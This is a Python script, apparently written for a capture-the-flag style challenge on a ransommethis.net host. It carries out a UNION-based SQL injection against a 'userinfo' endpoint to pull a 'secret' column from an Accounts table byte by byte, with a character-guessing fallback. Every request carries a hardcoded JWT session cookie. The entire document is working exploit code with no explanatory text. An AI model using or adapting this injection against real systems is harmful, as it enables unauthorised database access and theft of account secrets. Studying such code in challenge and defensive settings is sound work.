import binascii
import requests
import string

URL = "https://gztkmtljeceezgmv.ransommethis.net/jrtwtevqduetiiho/userinfo?user=AccessibleTinderbox%27%20union%20select%201,%20uid,%20uid,%20HEX(SUBSTR(secret,INDEX,1))%20from%20Accounts%20where%20userName%20=%20%27AccessibleTinderbox%27;%20--"
URL_LEAK = "https://gztkmtljeceezgmv.ransommethis.net/jrtwtevqduetiiho/userinfo?user=AccessibleTinderbox%27%20union%20select%201,%20uid,%20uid,%20INSTR(SUBSTR(secret,INDEX,1),%27CHAR%27)%20from%20Accounts%20where%20userName%20=%20%27AccessibleTinderbox%27;%20--"

i = 1

fail = "23" # '#'

alphabet = string.ascii_letters + string.digits

leaks = []
while i < 33:
    r = requests.get(URL.replace("INDEX", str(i)), cookies={"tok": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjEwODMzOTIsImV4cCI6MTY2MzY3NTM5MiwidWlkIjoyNTc2MSwic2VjIjoiUDVRUXVscUI1V2VCdVNvWE54UGxCc3F0RGVzSWRqcUMifQ.iC7i3P4YtLGPto70FxD4w9fvLI0R_hNDl3e2os6j0EM"})
    if r.status_code == 200:
        val = r.text.split("\n")[102].split(">")[1].split("<")[0]
        leaks.append(val)

        i += 1
        continue

    # try to leak it
    print(f"failed on {i}, trying to leak")

    for c in alphabet:
        r = requests.get(URL_LEAK.replace("INDEX", str(i)).replace("CHAR", c), cookies={"tok": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NjEwODMzOTIsImV4cCI6MTY2MzY3NTM5MiwidWlkIjoyNTc2MSwic2VjIjoiUDVRUXVscUI1V2VCdVNvWE54UGxCc3F0RGVzSWRqcUMifQ.iC7i3P4YtLGPto70FxD4w9fvLI0R_hNDl3e2os6j0EM"})
        if r.status_code == 200:
            val = r.text.split("\n")[102].split(">")[1].split("<")[0]
            if val == "0":
                continue
            print("leaked it")
            leaks.append(hex(ord(c))[2:])
            break
        else:
            print("couldn't check leak status")
    else:
        print("couldn't find a valid char")


    i += 1
    continue

print(binascii.unhexlify("".join(leaks)).decode())